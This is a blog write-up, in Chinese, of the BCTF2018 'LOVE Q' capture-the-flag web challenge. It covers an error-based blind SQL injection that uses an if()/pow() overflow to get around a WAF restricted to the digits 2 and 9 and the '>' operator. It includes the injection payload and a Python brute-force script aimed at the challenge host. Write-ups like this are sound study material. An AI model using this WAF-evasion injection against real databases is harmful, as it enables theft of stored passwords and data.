---
title: BCTF2018 LOVE Q
url: 317.html
id: 317
categories:
  - CTF
date: 2018-04-21 18:19:34
tags:
---

### 前言

为数不多做出来的“高分题”（刚做出来的时候算高分，后来就掉下去了），记录一下  

### 正文

进入首页 ![](http://blog.kingkk.com/wp-content/uploads/2018/04/bdf58748103944e1ee81757ddb270e9f.png) 
和之前的N1CTF的web 7777类似，算是一个升级版 
最恶心的部分是waf，过滤了很多 数字部分能用的只有 2 和 9 比较符号除了 >  其余等号和小于号都过滤了 
还有一个问题，没有回显,ha?这回的points设置之后无法判断回显 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/e85735afb4fd71611b99a3ad3205db6c.png) 
时间盲注的函数sleep、benchmark之类的函数都被禁用了 
没有回显怎么盲注呢，然后就将关注点转义到了为数不多的输出上   “sorry” 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/91b0928964b7a9dae41abbeee9b1ca9c.png) 
当语句执行出错时，会输出sorry，想到找到一个语法正确，但是无法执行的语句

mysql> select pow(2,22222222222);
ERROR 1690 (22003): DOUBLE value is out of range in 'pow(2,22222222222)'

利用次方运算导致数据超出double长度时，就会报错，但是不执行该语句时语法上是没问题的 这里短路运算符用不了，但是留了一个if
```sql
mysql> **select if(1,1,pow(2,22222222222));     //条件为真时，返回1**
+----------------------------+
| if(1,1,pow(2,22222222222)) |
+----------------------------+
|                          1 |
+----------------------------+
1 row in set (0.00 sec)

mysql> **select if(0,1,pow(2,22222222222));    //条件为假时，报错**
ERROR 1690 (22003): DOUBLE value is out of range in 'pow(2,22222222222)'
```
然后就是构造payload,
```
    flag=2
    hi=>>if((substr(pw,(9-2-2-2-2),(9-2-2-2-2))>'a'),2,pow(22,222222222222)
```
构造方面有两个麻烦的地方 1、只能用>进行比较运算, 于是前面的连接符就用>>位运算来做，后面判断勉强用 > 也能找到对应字符 2、数字只有2和9，运算符只有 * 和  - ，于是用（9-2-2-2-2）可以构造1，有了1和2，其他的数字应该也可以自行构造了 语句为真时无回显，语句为false时，输出sorry，就可以用来当作盲注的判断点 附上爆破脚本
```python
    #encoding=utf8
    import requests, string
    str_range = string.ascii_letters
    url = "http://3a7b823fc7994d62a92c3589fd05273b1254bc38b97743f2.game.ichunqiu.com"
    
    for i in str_range:
    	data = dict(flag=2,hi=">>if((substr(pw,2*2*2*2*2-9-2,(9-2-2-2-2))>'{}'),2,pow(22,222222222222))".format(i))
    	r = requests.post(url, data=data)
    	if 'sorry' in r.text:
    		print('sorry',i)
    	elif 'hacker' in r.text:
    		print("hacker")
    	else:
    		print("yes",i)
```
由于构造数字实在不好自动化，所以一位一位的半手工半自动化爆破吧。。 
还有一个问题，第14位的时候时a,大于比较时无法判断，可以改成用char来判断 要一直爆到20位，然后套上flag{}就是了  

### 总结

吐槽一下： 中间由于一些原因，去鉴定了下到底字符是大写还是小写(大于符号比较时，无法判断大小写) 
利用char去判断时，flag时大写的，然后各种不对，最后无意间改成小写，就通过了。。。